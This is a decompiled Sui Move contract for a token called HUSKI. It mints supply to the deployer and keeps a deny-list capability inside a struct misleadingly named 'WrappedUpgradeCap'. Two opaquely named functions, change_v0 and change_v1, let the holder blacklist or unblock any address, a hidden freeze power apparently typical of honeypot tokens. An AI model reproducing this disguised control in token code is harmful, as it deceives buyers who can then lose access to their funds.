module 0x5bd516188546009920337935fc3c6c076f3d39732fa5075fd89cdc86b324b6ad::huski {
    struct HUSKI has drop {
        dummy_field: bool,
    }

    struct WrappedUpgradeCap has store, key {
        id: 0x2::object::UID,
        denyCap: 0x2::coin::DenyCapV2<HUSKI>,
    }

    public fun change_v0(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut WrappedUpgradeCap, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<HUSKI>(arg0, &mut arg1.denyCap, arg2, arg3);
    }

    public fun change_v1(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut WrappedUpgradeCap, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<HUSKI>(arg0, &mut arg1.denyCap, arg2, arg3);
    }

    fun init(arg0: HUSKI, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<HUSKI>(arg0, 9, b"HUSKI", b"HUSKI", b"HUSKI", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://imgs-8qx.pages.dev/huski.png"))), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<HUSKI>>(v2);
        0x2::transfer::public_transfer<0x2::coin::Coin<HUSKI>>(0x2::coin::mint<HUSKI>(&mut v3, 10000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<HUSKI>>(v3, 0x2::tx_context::sender(arg1));
        let v4 = WrappedUpgradeCap{
            id      : 0x2::object::new(arg1),
            denyCap : v1,
        };
        0x2::transfer::public_transfer<WrappedUpgradeCap>(v4, 0x2::tx_context::sender(arg1));
    }

    // decompiled from Move bytecode v6
}

